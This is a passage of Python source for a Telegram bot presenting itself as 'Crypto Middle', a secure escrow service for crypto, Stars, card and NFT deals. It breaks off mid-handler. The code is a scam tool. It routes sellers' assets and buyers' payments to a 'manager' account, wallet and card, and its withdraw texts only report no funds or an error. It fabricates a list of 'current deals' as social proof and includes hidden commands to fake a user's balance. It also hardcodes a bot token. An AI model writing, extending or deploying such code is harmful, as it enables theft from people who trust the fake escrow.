import asyncio
import re
import random
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Message, InlineKeyboardMarkup, InlineKeyboardButton,
                           CallbackQuery, BotCommand)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command

BOT_TOKEN = "8690519608:AAFV_qszCZIyVTW2RuqELXY_kBdzBMwy3Po"
ADMIN_IDS = [174415647, 713129783, 90283607]

MANAGER_USERNAME = "@CryptoMiddleManager"
SUPPORT_USERNAME = "@CryptoMiddleSupport"
TON_ADDRESS  = "UQDUUFncBcWC4eH3wN_4G3N9Yaf6nBFlcumDP8daYAQHNSOc"
CARD_NUMBER  = "4276 3801 2345 6789"
CARD_HOLDER  = "Александр Ф."
CARD_BANK    = "ВТБ Банк"

SAFETY_PAGE = "https://telegra.ph/Bezopasnost-sdelok-CryptoMiddle-01-01"

FAKE_DEALS = [
    {"amount": 5,   "desc": "Аккаунт Steam",       "cur": "USDT"},
    {"amount": 40,  "desc": "Подписка Spotify",     "cur": "USDT"},
    {"amount": 120, "desc": "Игровой ключ",         "cur": "USDT"},
    {"amount": 2,   "desc": "Донат в игре",         "cur": "USDT"},
    {"amount": 16,  "desc": "VPN на год",           "cur": "USDT"},
    {"amount": 75,  "desc": "Аккаунт Netflix",      "cur": "USDT"},
    {"amount": 33,  "desc": "Подписка Telegram",    "cur": "USDT"},
    {"amount": 200, "desc": "Аккаунт YouTube",      "cur": "USDT"},
    {"amount": 8,   "desc": "Промокод магазина",    "cur": "USDT"},
    {"amount": 55,  "desc": "Доступ к сервису",     "cur": "USDT"},
]

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())

user_data    = {}
deals        = {}
deal_counter = [1000]

def get_user(uid):
    if uid not in user_data:
        user_data[uid] = {
            "ton_wallet": "", "card_number": "", "card_name": "",
            "stars_username": "",
            "has_requisites": False,
            "balance": 0.0, "reputation": 0,
            "deals_count": 0, "reviews": [], "lang": "ru",
            "turnover": 0.0
        }
    return user_data[uid]

def get_lang(uid):
    return get_user(uid).get("lang", "ru")

def L(uid, key, **kw):
    lang = get_lang(uid)
    t = LANGS.get(lang, LANGS["ru"]).get(key) or LANGS["ru"].get(key, key)
    return t.format(**kw) if kw else t

def gen_deal_id():
    deal_counter[0] += 1
    return f"CD{deal_counter[0]}"

username_map = {}

def reg(msg: Message):
    if msg.from_user and msg.from_user.username:
        username_map[msg.from_user.username.lower()] = msg.from_user.id

def find_uid(q: str):
    q = q.strip()
    if q.startswith("@"):
        return username_map.get(q[1:].lower())
    try:
        uid = int(q)
        return uid if uid in user_data else None
    except ValueError:
        return None

def valid_card(num: str) -> bool:
    digits = re.sub(r"[\s\-]", "", num)
    return digits.isdigit() and len(digits) == 16

def valid_ton(addr: str) -> bool:
    return bool(re.match(r"^[UE]Q[A-Za-z0-9_\-]{46}$", addr.strip()))

def mask_username(username: str) -> str:
    if not username:
        return "***"
    if username.startswith("@"):
        username = username[1:]
    if len(username) <= 3:
        return "@" + username[0] + "***"
    return "@" + username[:2] + "***" + username[-1]

async def safe_del(msg):
    try:
        await msg.delete()
    except Exception:
        pass

class SetBanner(StatesGroup):
    waiting = State()

class AddReq(StatesGroup):
    ton       = State()
    card_num  = State()
    card_name = State()
    stars     = State()

class Deal(StatesGroup):
    partner     = State()
    description = State()
    currency    = State()
    amount      = State()

class TopUp(StatesGroup):
    amount = State()

class AdminAction(StatesGroup):
    reputation = State()
    balance    = State()
    review     = State()

class NeptuneAction(StatesGroup):
    command = State()

_M = MANAGER_USERNAME
_S = SUPPORT_USERNAME

LANGS = {
"ru": {
"welcome": (
    "<b>Добро пожаловать 👋</b>\n\n"
    "<b>Crypto Middle</b> - сервис безопасных сделок.\n\n"
    "<b>Автоматизированное исполнение.</b>\n"
    "<b>Быстрый вывод средств.</b>\n\n"
    "<b>Комиссия: 0%</b>\n"
    "<b>Режим: 24/7</b>\n"
    f"<b>Поддержка: {_S}</b>"
),
"btn_deal":        "🔐 Создать сделку",
"btn_req":         "🧾 Реквизиты",
"btn_topup":       "💰 Пополнить баланс",
"btn_withdraw":    "💸 Вывести средства",
"btn_security":    "🛡 Безопасность",
"btn_support":     "📋 Поддержка",
"btn_language":    "🌐 Язык",
"btn_menu":        "📱 В меню",
"btn_back":        "◀️ Назад",
"btn_cancel":      "❌ Отмена",
"btn_agree":       "📍 Подтвердить ознакомление",
"btn_paid":        "💸 Я оплатил",
"btn_manager":     "💬 Написать менеджеру",
"btn_why_safe":    "🛡 Почему это безопасно?",
"btn_cur_deals":   "📋 Текущие сделки",

"agreement": (
    "<b>Пользовательское соглашение</b>\n\n"
    "<b>Для сохранности активов соблюдайте правила:</b>\n\n"
    f"<b>Передача активов только через: {_M}</b>\n\n"
    "<b>Прямые переводы запрещены.</b>\n\n"
    "<b>Вывод производится после подтверждения обеими сторонами.</b>\n\n"
    "<b>Нажмите кнопку для подтверждения.</b>"
),

"deal_step1": (
    "<b>Создание сделки - Шаг 1/4</b>\n\n"
    "<b>Введите @username второго участника:</b>\n\n"
    "<b>Пример: @username</b>"
),
"deal_step2": (
    "<b>Создание сделки - Шаг 2/4</b>\n\n"
    "<b>Введите суть сделки (минимум 8 символов):</b>"
),
"deal_step2_short": "<b>Суть должна быть не менее 8 символов. Введите снова:</b>",
"deal_step3": (
    "<b>Создание сделки - Шаг 3/4</b>\n\n"
    "<b>Выберите валюту оплаты:</b>"
),
"deal_step4": (
    "<b>Создание сделки - Шаг 4/4</b>\n\n"
    "<b>Введите сумму сделки:</b>"
),

"no_req_ton": (
    "<b>Вы не добавили реквизиты.</b>\n\n"
    "<b>Добавьте TON-кошелек для получения оплаты.</b>"
),
"no_req_card": (
    "<b>Вы не добавили реквизиты.</b>\n\n"
    "<b>Добавьте номер карты для получения оплаты.</b>"
),
"no_req_stars": (
    "<b>Вы не добавили реквизиты.</b>\n\n"
    "<b>Добавьте username для получения Stars.</b>"
),

"deal_created": (
    "<b>Сделка создана!</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Участник: {partner}</b>\n"
    "<b>Суть: {description}</b>\n"
    "<b>Сумма: {amount}</b>\n"
    "<b>Валюта: {currency}</b>\n\n"
    "<b>Ссылка для участника:</b>\n"
    "<code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
    "<b>Как проходит сделка:</b>\n"
    f"<b>1. Продавец передает актив менеджеру: {_M}</b>\n"
    "<b>2. Менеджер подтверждает получение</b>\n"
    "<b>3. Покупатель отправляет оплату</b>\n"
    "<b>4. Менеджер передает актив покупателю</b>\n\n"
    "<b>Среднее время: 5-15 минут</b>\n"
    "<b>Статус: Активна</b>"
),

"deal_joined_seller": (
    "<b>По вашей сделке перешел участник!</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Участник: {buyer}</b>\n\n"
    "<b>Условия сделки:</b>\n"
    "<b>Суть: {description}</b>\n"
    "<b>Сумма: {amount} {currency}</b>\n\n"
    f"<b>Передайте актив менеджеру: {_M}</b>\n"
    "<b>После подтверждения покупатель отправит оплату.</b>"
),

"deal_joined_buyer": (
    "<b>Информация о сделке</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Суть: {description}</b>\n"
    "<b>Сумма: {amount}</b>\n"
    "<b>Валюта: {currency}</b>\n"
    "<b>Статус: Активна</b>\n\n"
    f"<b>Продавец должен передать товар менеджеру: {_M}</b>\n\n"
    "<b>Дождитесь подтверждения передачи актива.</b>\n"
    "<b>После этого нажмите кнопку оплаты.</b>"
),

"own_deal":       "<b>Это ваша собственная сделка.</b>",
"deal_not_found": "<b>Сделка не найдена или уже завершена.</b>",

"paid_notify_admin": (
    "<b>Пользователь сообщил об оплате</b>\n\n"
    "<b>Сделка: {deal_id}</b>\n"
    "<b>Пользователь: {user}</b>\n"
    "<b>Сумма: {amount} {currency}</b>"
),
"paid_notify_seller": (
    "<b>Покупатель сообщил об оплате по сделке {deal_id}</b>\n\n"
    "<b>Менеджер проверяет оплату.</b>"
),
"paid_confirm": (
    "<b>Уведомление об оплате отправлено менеджеру.</b>\n\n"
    "<b>Ожидайте подтверждения.</b>"
),

"req_title": (
    "<b>Реквизиты</b>\n\n"
    "<b>TON: {ton}</b>\n"
    "<b>Карта: {card}</b>\n"
    "<b>Держатель: {card_name}</b>\n"
    "<b>Stars username: {stars}</b>"
),
"req_ton_saved":       "<b>TON кошелек сохранен!</b>",
"req_card_num_saved":  "<b>Теперь введите имя держателя карты:</b>",
"req_card_saved":      "<b>Карта сохранена!</b>",
"req_stars_saved":     "<b>Username для Stars сохранен!</b>",
"req_ton_invalid": (
    "<b>Некорректный TON адрес.</b>\n"
    "<b>Должен начинаться с UQ или EQ и содержать 48 символов.</b>\n\n"
    "<b>Введите снова:</b>"
),
"req_card_invalid": (
    "<b>Некорректный номер карты.</b>\n"
    "<b>Введите 16 цифр (пробелы допускаются).</b>\n\n"
    "<b>Введите снова:</b>"
),
"redo_deal":       "\n\n<b>Теперь создайте сделку заново.</b>",
"enter_ton":       "<b>Введите ваш TON кошелек:</b>",
"enter_card_num":  "<b>Введите номер карты (16 цифр):</b>",
"enter_card_name": "<b>Введите имя держателя карты:</b>",
"enter_stars":     "<b>Введите ваш Telegram username для получения Stars:</b>",

"topup_title":          "<b>Пополнение баланса</b>\n\n<b>Выберите способ:</b>",
"topup_enter_amount":   "<b>Введите сумму пополнения:</b>",
"topup_amount_invalid": "<b>Некорректная сумма. Введите число, например: 100</b>",

"topup_stars": (
    "<b>Пополнение Stars</b>\n\n"
    "<b>Сумма: {amount} Stars</b>\n\n"
    f"<b>Отправьте Stars на: {_M}</b>\n\n"
    "<b>Перейдите в диалог и отправьте нужное количество Stars.</b>\n"
    "<b>После отправки нажмите кнопку ниже.</b>\n\n"
    "<b>Время зачисления: 5-15 минут</b>"
),
"topup_ton": (
    "<b>Пополнение TON</b>\n\n"
    "<b>Сумма: {amount} TON</b>\n\n"
    f"<code>{TON_ADDRESS}</code>\n\n"
    f"<b>После отправки напишите: {_S}</b>\n\n"
    "<b>Время зачисления: 5-15 минут</b>"
),
"topup_card": (
    "<b>Пополнение картой</b>\n\n"
    "<b>Сумма: {amount} RUB</b>\n\n"
    f"<b>Банк: {CARD_BANK}</b>\n"
    f"<b>Номер: <code>{CARD_NUMBER}</code></b>\n"
    f"<b>Держатель: {CARD_HOLDER}</b>\n\n"
    "<b>Сохраните чек и нажмите кнопку ниже.</b>\n\n"
    "<b>Время зачисления: 5-15 минут</b>"
),
"topup_nft": (
    "<b>Пополнение NFT</b>\n\n"
    f"<b>Передайте актив: {_M}</b>\n\n"
    "<b>После проверки будет оценка в Stars или TON.</b>\n\n"
    "<b>Время зачисления: 5-15 минут</b>"
),

"withdraw_no_funds": (
    "<b>У вас нету средств для вывода.</b>\n\n"
    "<b>Пополните баланс и попробуйте снова.</b>"
),
"withdraw_error": (
    "<b>Произошла ошибка при выводе.</b>\n\n"
    f"<b>Обратитесь в поддержку: {_S}</b>"
),

"security": (
    "<b>Безопасность при передаче активов</b>\n\n"
    f"<b>Передача только через: {_M}</b>\n\n"
    "<b>Прямые транзакции запрещены.</b>\n"
    "<b>Сверяйте сумму и ID сделки.</b>\n"
    "<b>Вывод после подтверждения обеими сторонами.</b>"
),
"lang_choose": "<b>Выберите язык:</b>",
"lang_set":    "<b>Язык установлен: Русский</b>",
"invalid_username": "<b>Введите корректный @username (должен начинаться с @):</b>",

"cur_deals_title": "<b>Текущие сделки</b>\n\n",
"cur_deal_line": "<b>Сделка #{num}</b> | <b>{amount}$ - {desc}</b>\n<b>Покупатель: {buyer} | Продавец: {seller}</b>\n<b>Статус: Активна</b>\n\n",
},

"en": {
"welcome": (
    "<b>Welcome 👋</b>\n\n"
    "<b>Crypto Middle</b> - secure OTC deal service.\n\n"
    "<b>Automated deal execution.</b>\n"
    "<b>Fast withdrawal.</b>\n\n"
    "<b>Commission: 0%</b>\n"
    "<b>Hours: 24/7</b>\n"
    f"<b>Support: {_S}</b>"
),
"btn_deal":        "🔐 Create Deal",
"btn_req":         "🧾 Requisites",
"btn_topup":       "💰 Top Up",
"btn_withdraw":    "💸 Withdraw",
"btn_security":    "🛡 Security",
"btn_support":     "📋 Support",
"btn_language":    "🌐 Language",
"btn_menu":        "📱 Menu",
"btn_back":        "◀️ Back",
"btn_cancel":      "❌ Cancel",
"btn_agree":       "📍 Confirm Agreement",
"btn_paid":        "💸 I Paid",
"btn_manager":     "💬 Write to Manager",
"btn_why_safe":    "🛡 Why is this safe?",
"btn_cur_deals":   "📋 Current Deals",

"agreement": (
    "<b>User Agreement</b>\n\n"
    "<b>To protect your assets, follow the rules:</b>\n\n"
    f"<b>Transfer assets only through: {_M}</b>\n\n"
    "<b>Direct transfers are prohibited.</b>\n\n"
    "<b>Withdrawal after both sides confirm.</b>\n\n"
    "<b>Press the button to confirm.</b>"
),

"deal_step1": (
    "<b>Create Deal - Step 1/4</b>\n\n"
    "<b>Enter @username of the second participant:</b>\n\n"
    "<b>Example: @username</b>"
),
"deal_step2": (
    "<b>Create Deal - Step 2/4</b>\n\n"
    "<b>Describe the deal (minimum 8 characters):</b>"
),
"deal_step2_short": "<b>Description must be at least 8 characters. Try again:</b>",
"deal_step3": (
    "<b>Create Deal - Step 3/4</b>\n\n"
    "<b>Choose payment currency:</b>"
),
"deal_step4": (
    "<b>Create Deal - Step 4/4</b>\n\n"
    "<b>Enter the deal amount:</b>"
),

"no_req_ton": (
    "<b>You have not added requisites.</b>\n\n"
    "<b>Add your TON wallet to receive payment.</b>"
),
"no_req_card": (
    "<b>You have not added requisites.</b>\n\n"
    "<b>Add your card number to receive payment.</b>"
),
"no_req_stars": (
    "<b>You have not added requisites.</b>\n\n"
    "<b>Add your username to receive Stars.</b>"
),

"deal_created": (
    "<b>Deal created!</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Participant: {partner}</b>\n"
    "<b>Description: {description}</b>\n"
    "<b>Amount: {amount}</b>\n"
    "<b>Currency: {currency}</b>\n\n"
    "<b>Participant link:</b>\n"
    "<code>https://t.me/{bot_username}?start=deal_{deal_id}</code>\n\n"
    "<b>How the deal works:</b>\n"
    f"<b>1. Seller transfers asset to: {_M}</b>\n"
    "<b>2. Manager confirms receipt</b>\n"
    "<b>3. Buyer sends payment</b>\n"
    "<b>4. Manager transfers asset to buyer</b>\n\n"
    "<b>Average time: 5-15 minutes</b>\n"
    "<b>Status: Active</b>"
),

"deal_joined_seller": (
    "<b>A participant joined your deal!</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Participant: {buyer}</b>\n\n"
    "<b>Deal terms:</b>\n"
    "<b>Description: {description}</b>\n"
    "<b>Amount: {amount} {currency}</b>\n\n"
    f"<b>Transfer the asset to manager: {_M}</b>\n"
    "<b>After confirmation, the buyer will send payment.</b>"
),

"deal_joined_buyer": (
    "<b>Deal Information</b>\n\n"
    "<b>ID: {deal_id}</b>\n"
    "<b>Description: {description}</b>\n"
    "<b>Amount: {amount}</b>\n"
    "<b>Currency: {currency}</b>\n"
    "<b>Status: Active</b>\n\n"
    f"<b>Seller must transfer the asset to manager: {_M}</b>\n\n"
    "<b>Wait for confirmation that the asset was transferred.</b>\n"
    "<b>Then press the payment button.</b>"
),

"own_deal":       "<b>This is your own deal.</b>",
"deal_not_found": "<b>Deal not found or already closed.</b>",

"paid_notify_admin": (
    "<b>User reported payment</b>\n\n"
    "<b>Deal: {deal_id}</b>\n"
    "<b>User: {user}</b>\n"
    "<b>Amount: {amount} {currency}</b>"
),
"paid_notify_seller": (
    "<b>Buyer reported payment for deal {deal_id}</b>\n\n"
    "<b>Manager is verifying.</b>"
),
"paid_confirm": (
    "<b>Payment notification sent to manager.</b>\n\n"
    "<b>Waiting for confirmation.</b>"
),

"req_title": (
    "<b>Requisites</b>\n\n"
    "<b>TON: {ton}</b>\n"
    "<b>Card: {card}</b>\n"
    "<b>Holder: {card_name}</b>\n"
    "<b>Stars username: {stars}</b>"
),
"req_ton_saved":       "<b>TON wallet saved!</b>",
"req_card_num_saved":  "<b>Now enter the cardholder name:</b>",
"req_card_saved":      "<b>Card saved!</b>",
"req_stars_saved":     "<b>Stars username saved!</b>",
"req_ton_invalid": (
    "<b>Invalid TON address.</b>\n"
    "<b>Must start with UQ or EQ and be 48 characters.</b>\n\n"
    "<b>Enter again:</b>"
),
"req_card_invalid": (
    "<b>Invalid card number.</b>\n"
    "<b>Enter 16 digits (spaces allowed).</b>\n\n"
    "<b>Enter again:</b>"
),
"redo_deal":       "\n\n<b>Now create the deal again.</b>",
"enter_ton":       "<b>Enter your TON wallet:</b>",
"enter_card_num":  "<b>Enter your card number (16 digits):</b>",
"enter_card_name": "<b>Enter the cardholder name:</b>",
"enter_stars":     "<b>Enter your Telegram username to receive Stars:</b>",

"topup_title":          "<b>Top Up Balance</b>\n\n<b>Choose method:</b>",
"topup_enter_amount":   "<b>Enter the top-up amount:</b>",
"topup_amount_invalid": "<b>Invalid amount. Enter a number, e.g.: 100</b>",

"topup_stars": (
    "<b>Top Up with Stars</b>\n\n"
    "<b>Amount: {amount} Stars</b>\n\n"
    f"<b>Send Stars to: {_M}</b>\n\n"
    "<b>Open the chat and send the Stars.</b>\n"
    "<b>After sending, press the button below.</b>\n\n"
    "<b>Processing time: 5-15 minutes</b>"
),
"topup_ton": (
    "<b>Top Up with TON</b>\n\n"
    "<b>Amount: {amount} TON</b>\n\n"
    f"<code>{TON_ADDRESS}</code>\n\n"
    f"<b>After sending, contact: {_S}</b>\n\n"
    "<b>Processing time: 5-15 minutes</b>"
),
"topup_card": (
    "<b>Top Up with Card</b>\n\n"
    "<b>Amount: {amount} RUB</b>\n\n"
    f"<b>Bank: {CARD_BANK}</b>\n"
    f"<b>Number: <code>{CARD_NUMBER}</code></b>\n"
    f"<b>Holder: {CARD_HOLDER}</b>\n\n"
    "<b>Save your receipt and press the button below.</b>\n\n"
    "<b>Processing time: 5-15 minutes</b>"
),
"topup_nft": (
    "<b>Top Up with NFT</b>\n\n"
    f"<b>Transfer to: {_M}</b>\n\n"
    "<b>After verification, valuation in Stars or TON.</b>\n\n"
    "<b>Processing time: 5-15 minutes</b>"
),

"withdraw_no_funds": (
    "<b>You have no funds to withdraw.</b>\n\n"
    "<b>Top up your balance first.</b>"
),
"withdraw_error": (
    "<b>An error occurred during withdrawal.</b>\n\n"
    f"<b>Contact support: {_S}</b>"
),

"security": (
    "<b>Asset Transfer Security</b>\n\n"
    f"<b>Transfer only through: {_M}</b>\n\n"
    "<b>Direct transactions are prohibited.</b>\n"
    "<b>Verify the amount and deal ID.</b>\n"
    "<b>Withdrawal after both sides confirm.</b>"
),
"lang_choose": "<b>Choose language:</b>",
"lang_set":    "<b>Language set: English</b>",
"invalid_username": "<b>Enter a valid @username (must start with @):</b>",

"cur_deals_title": "<b>Current Deals</b>\n\n",
"cur_deal_line": "<b>Deal #{num}</b> | <b>{amount}$ - {desc}</b>\n<b>Buyer: {buyer} | Seller: {seller}</b>\n<b>Status: Active</b>\n\n",
},
}

# ── keyboards ────────────────────────────────────────────────────────────────

def main_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_deal"),      callback_data="deal"),
         InlineKeyboardButton(text=L(uid,"btn_req"),       callback_data="requisites")],
        [InlineKeyboardButton(text=L(uid,"btn_topup"),     callback_data="topup"),
         InlineKeyboardButton(text=L(uid,"btn_withdraw"),  callback_data="withdraw")],
        [InlineKeyboardButton(text=L(uid,"btn_security"),  callback_data="security"),
         InlineKeyboardButton(text=L(uid,"btn_support"),   url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(text=L(uid,"btn_cur_deals"), callback_data="cur_deals"),
         InlineKeyboardButton(text=L(uid,"btn_language"),  callback_data="language")],
    ])

def back_kb(uid, cb="menu"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data=cb)],
    ])

def cancel_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")],
    ])

def agreement_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_agree"), callback_data="confirm_agreement")],
        [InlineKeyboardButton(text=L(uid,"btn_back"),  callback_data="menu")],
    ])

def currency_kb(uid):
    ru = get_lang(uid) == "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON",    callback_data="deal_cur_ton"),
         InlineKeyboardButton(text="⭐️ Stars",  callback_data="deal_cur_stars")],
        [InlineKeyboardButton(text="💳 Карта (RUB)" if ru else "💳 Card (RUB)",
                              callback_data="deal_cur_card"),
         InlineKeyboardButton(text="🎁 NFT",    callback_data="deal_cur_nft")],
        [InlineKeyboardButton(text=L(uid,"btn_cancel"), callback_data="menu")],
    ])

def deal_seller_kb(uid, deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_paid"),    callback_data=f"paid_{deal_id}")],
        [InlineKeyboardButton(text=L(uid,"btn_manager"), url=f"https://t.me/{MANAGER_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(text=L(uid,"btn_why_safe"), url=SAFETY_PAGE)],
        [InlineKeyboardButton(text=L(uid,"btn_back"),    callback_data="menu")],
    ])

def deal_buyer_kb(uid, deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_paid"),    callback_data=f"paid_{deal_id}")],
        [InlineKeyboardButton(text=L(uid,"btn_manager"), url=f"https://t.me/{MANAGER_USERNAME.lstrip('@')}")],
        [InlineKeyboardButton(text=L(uid,"btn_why_safe"), url=SAFETY_PAGE)],
        [InlineKeyboardButton(text=L(uid,"btn_back"),    callback_data="menu")],
    ])

def req_kb(uid):
    ru = get_lang(uid) == "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 TON",    callback_data="req_ton"),
         InlineKeyboardButton(text="💳 Карта" if ru else "💳 Card", callback_data="req_card")],
        [InlineKeyboardButton(text="⭐️ Stars",  callback_data="req_stars")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
    ])

def add_req_kb(uid, req_type):
    ru = get_lang(uid) == "ru"
    label = "Добавить" if ru else "Add"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"+ {label}", callback_data=f"req_{req_type}_deal")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
    ])

def topup_kb(uid):
    ru = get_lang(uid) == "ru"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐️ Stars", callback_data="topup_stars"),
         InlineKeyboardButton(text="💎 TON",   callback_data="topup_ton")],
        [InlineKeyboardButton(text="💳 Карта" if ru else "💳 Card", callback_data="topup_card"),
         InlineKeyboardButton(text="🎁 NFT",   callback_data="topup_nft")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="menu")],
    ])

def topup_paid_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=L(uid,"btn_paid"), callback_data="paid_topup")],
        [InlineKeyboardButton(text=L(uid,"btn_back"), callback_data="topup")],
    ])

def language_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="setlang_ru"),
         InlineKeyboardButton(text="🇬🇧 English",  callback_data="setlang_en")],
    ])

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Баннер",       callback_data="adm_banner"),
         InlineKeyboardButton(text="Статистика",   callback_data="adm_stats")],
        [InlineKeyboardButton(text="Пользователи", callback_data="adm_users"),
         InlineKeyboardButton(text="Репутация",    callback_data="adm_reputation")],
        [InlineKeyboardButton(text="Отзыв",        callback_data="adm_review"),
         InlineKeyboardButton(text="Баланс",       callback_data="adm_balance")],
        [InlineKeyboardButton(text="Сделки",       callback_data="adm_deals")],
    ])

# ── show menu ────────────────────────────────────────────────────────────────

async def show_menu(message: Message, uid: int):
    banner  = user_data.get("_banner")
    welcome = L(uid, "welcome")
    kb      = main_kb(uid)
    if banner:
        await message.answer_photo(photo=banner["photo_id"],
                                   caption=banner.get("caption") or welcome,
                                   parse_mode="HTML", reply_markup=kb)
    else:
        await message.answer(welcome, parse_mode="HTML", reply_markup=kb)

# ── /start ───────────────────────────────────────────────────────────────────

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    uid = message.from_user.id
    get_user(uid)
    if message.from_user.username:
        username_map[message.from_user.username.lower()] = uid
    await state.clear()

    args = message.text.split()
    if len(args) > 1 and args[1].startswith("deal_"):
        deal_id = args[1].replace("deal_", "", 1)
        deal    = deals.get(deal_id)
        if not deal:
            await message.answer(L(uid, "deal_not_found"), reply_markup=main_kb(uid))
            return
        if deal["uid"] == uid:
            await message.answer(L(uid, "own_deal"), reply_markup=main_kb(uid))
            return

        buyer_name = f"@{message.from_user.username}" if message.from_user.username else f"ID:{uid}"

        await message.answer(
            L(uid, "deal_joined_buyer",
              deal_id=deal_id,
              description=deal["description"],
              amount=deal["amount"],
              currency=deal["currency"]),
            parse_mode="HTML",
            reply_markup=deal_buyer_kb(uid, deal_id)
        )

        seller_uid = deal["uid"]
        try:
            await bot.send_message(
                seller_uid,
                L(seller_uid, "deal_joined_seller",
                  deal_id=deal_id, buyer=buyer_name,
                  description=deal["description"],
                  amount=deal["amount"],
                  currency=deal["currency"]),
                parse_mode="HTML",
                reply_markup=deal_seller_kb(seller_uid, deal_id)
            )
        except Exception:
            pass
        return

    await show_menu(message, uid)

# ── /neptunteam ───────────────────────────────────────────────────────────────

@dp.message(Command("neptunteam"))
async def cmd_neptune(message: Message, state: FSMContext):
    uid = message.from_user.id
    get_user(uid)
    u = get_user(uid)
    text = (
        f"<b>Neptune Panel</b>\n\n"
        f"<b>Ваш баланс: {u.get('balance', 0.0)}</b>\n"
        f"<b>Репутация: {u.get('reputation', 0)}</b>\n"
        f"<b>Сделок: {u.get('deals_count', 0)}</b>\n"
        f"<b>Оборот: {u.get('turnover', 0.0)}$</b>\n\n"
        f"<b>Отзывы:</b>\n"
    )
    reviews = u.get("reviews", [])
    if reviews:
        for r in reviews[-5:]:
            text += f"<b>- {r}</b>\n"
    else:
        text += "<b>Отзывов нет</b>\n"
    text += (
        "\n<b>Команды:</b>\n"
        "<b>/neptune_add 100 - добавить баланс</b>\n"
        "<b>/neptune_sub 50 - снять баланс</b>"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message(Command("neptune_add"))
async def cmd_neptune_add(message: Message):
    uid = message.from_user.id
    get_user(uid)
    try:
        parts  = message.text.strip().split()
        amount = float(parts[1])
        user   = get_user(uid)
        user["balance"]  = user.get("balance", 0.0) + amount
        user["turnover"] = user.get("turnover", 0.0) + amount
        await message.answer(
            f"<b>Баланс пополнен на {amount}</b>\n<b>Текущий баланс: {user['balance']}</b>",
            parse_mode="HTML"
        )
    except Exception:
        await message.answer("<b>Формат: /neptune_add 100</b>", parse_mode="HTML")

@dp.message(Command("neptune_sub"))
async def cmd_neptune_sub(message: Message):
    uid = message.from_user.id
    get_user(uid)
    try:
        parts  = message.text.strip().split()
        amount = float(parts[1])
        user   = get_user(uid)
        user["balance"] = max(0.0, user.get("balance", 0.0) - amount)
        await message.answer(
            f"<b>Списано {amount}</b>\n<b>Текущий баланс: {user['balance']}</b>",
            parse_mode="HTML"
        )
    except Exception:
        await message.answer("<b>Формат: /neptune_sub 50</b>", parse_mode="HTML")

# ── current deals ─────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "cur_deals")
async def cb_cur_deals(callback: CallbackQuery):
    uid  = callback.from_user.id
    lang = get_lang(uid)
    text = L(uid, "cur_deals_title")

    fake = random.sample(FAKE_DEALS, min(5, len(FAKE_DEALS)))
    names_pool = ["u***r", "a***x", "m***e", "s***n", "k***v", "d***o", "p***l", "t***s"]

    for i, d in enumerate(fake, 1):
        buyer  = random.choice(names_pool)
        seller = random.choice([n for n in names_pool if n != buyer])
        text += L(uid, "cur_deal_line",
                  num=i,
                  amount=d["amount"],
                  desc=d["desc"],
                  buyer=f"@{buyer}",
                  seller=f"@{seller}")

    await safe_del(callback.message)
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_kb(uid))
    await callback.answer()

# ── menu ─────────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "menu")
async def cb_menu(callback: CallbackQuery, state: FSMContext):
    uid = callback.from_user.id
    await state.clear()
    await safe_del(callback.message)
    await show_menu(callback.message, uid)
    await callback.answer()

# ── language ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "language")
async def cb_language(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"lang_choose"), parse_mode="HTML",
                                  reply_markup=language_kb())
    await callback.answer()

@dp.callback_query(F.data.startswith("setlang_"))
async def cb_setlang(callback: CallbackQuery):
    uid  = callback.from_user.id
    lang = callback.data.replace("setlang_","")
    if lang not in LANGS: lang = "ru"
    get_user(uid)["lang"] = lang
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"lang_set"), parse_mode="HTML")
    await show_menu(callback.message, uid)
    await callback.answer()

# ── security ─────────────────────────────────────────────────────────────────

@dp.callback_query(F.data == "security")
async def cb_security(callback: CallbackQuery):
    uid = callback.from_user.id
    await safe_del(callback.message)
    await callback.message.answer(L(uid,"security"), parse_mode="HTML",
                                  reply_markup=InlineKeyboardMarkup(inline_keyboard=[
